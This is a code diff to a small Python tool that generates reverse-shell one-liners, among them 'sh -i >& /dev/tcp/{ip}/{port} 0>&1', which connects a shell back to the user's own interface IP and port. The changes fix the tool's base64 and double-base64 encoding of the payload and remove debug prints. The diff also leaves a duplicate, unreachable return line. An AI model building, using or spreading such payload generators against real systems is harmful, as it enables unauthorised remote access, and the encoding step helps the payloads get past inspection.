@@ -24,12 +24,11 @@ def get_options():
         i=i-1
         enco = False
     else:
-        enco=sys.argv[i+1]
+        enco=sys.argv[i+2]
     
     type=sys.argv[i+3]
     port = sys.argv[i+4]
     interface= sys.argv[i+5]
-    print(i)
     return display, enco , type,port,interface
 
 def get_ip(interface):
@@ -48,10 +47,15 @@ def typess(type,port,ip):
     elif type == "sh":
         return f"sh -i >& /dev/tcp/{ip}/{port} 0>&1"
 def encode(shell,enco):
-    if enco == "base64":
-        shell = base64.b64encode(shell)
-    elif enco == "2base64":
-        shell = base64.b64encode(base64.b64encode(shell))
+    bytes = shell.encode("utf-8")
+    
+    en_bytes = base64.b64encode(bytes)
+    shell = en_bytes.decode('utf-8')
+    if enco == "2base64":
+        en_bytes = base64.b64encode((en_bytes))
+        shell = en_bytes.decode('utf-8')
+    return shell
+
     return shell
 def display (dis,shell):
     if dis == "f":
@@ -67,7 +71,6 @@ try:
         help()
         exit()
     dis , enco,type,port,interface = get_options()
-    print(interface)
     ip=get_ip(interface)
     shell = typess(type,port,ip)
     if enco != False:
